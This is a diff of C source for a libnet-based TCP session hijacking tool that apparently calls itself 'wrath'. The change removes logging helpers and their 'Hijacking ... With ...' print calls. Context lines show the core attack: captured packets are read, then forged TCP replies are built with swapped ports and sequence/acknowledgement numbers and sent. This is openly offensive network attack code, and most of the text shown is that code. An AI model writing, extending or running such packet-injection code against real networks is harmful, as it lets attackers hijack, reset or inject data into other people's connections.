@@ -1,29 +1,6 @@
 #include <libnet.h>
 #include "wrath-structs.h"
  
-/* builds a raw tcp packet
- * @param an argument bundle
- * @param the packet captured */
-void wrath_capture_stats(struct libnet_ipv4_hdr *iphdr, struct libnet_tcp_hdr *tcphdr) {
-
-	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
-	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
-	printf("Seq: %u ", ntohl(tcphdr->th_seq));
-	printf("Ack: %u\n", ntohl(tcphdr->th_ack));
-	printf("Control: 0x%04x\n", (tcphdr->th_flags));
-	printf("\n");
-}
-
-void wrath_attack_packet_stats(struct libnet_ipv4_hdr *iphdr, struct libnet_tcp_hdr *tcphdr, int tcp_sum, int payload_size) {
-
-	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
-	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
-	printf("Seq: %u ", ntohl(tcphdr->th_ack));
-	printf("Ack: %u\n", ntohl(tcphdr->th_seq));
-	printf("Control: 0x%04x\n", tcp_sum);
-	printf("%d bytes of data\n", payload_size);
-	printf("----------------\n");
-}
 
 void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet) {
 	struct lcp_package *package = (struct lcp_package *) args;
@@ -38,11 +15,6 @@ void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet) {
 
 	int tcp_sum = cline_args->tcp_syn + cline_args->tcp_fin + cline_args->tcp_ack + cline_args->tcp_psh + cline_args->tcp_urg + cline_args->tcp_rst;	
 
-	printf("Hijacking ... ");
-	wrath_capture_stats(iphdr, tcphdr);
-	printf("With ... ");
-	wrath_attack_packet_stats(iphdr, tcphdr, tcp_sum, 0);
-	
 	/* building tcp header */
 	libnet_build_tcp( ntohs(tcphdr->th_dport), ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack),
 	ntohl(tcphdr->th_seq), tcp_sum, 4024, 0, 0, 0, NULL, 0, libnet_handle, 0);
@@ -100,11 +72,6 @@ void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsign
 	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
 	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
 
-	printf("Hijacking ... ");
-	wrath_capture_stats(iphdr, tcphdr);
-	printf("With ... ");
-	wrath_attack_packet_stats(iphdr, tcphdr, tcp_sum, strlen(payload));
-	
 	/* libnet_build_tcp */
 	libnet_build_tcp(
 	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
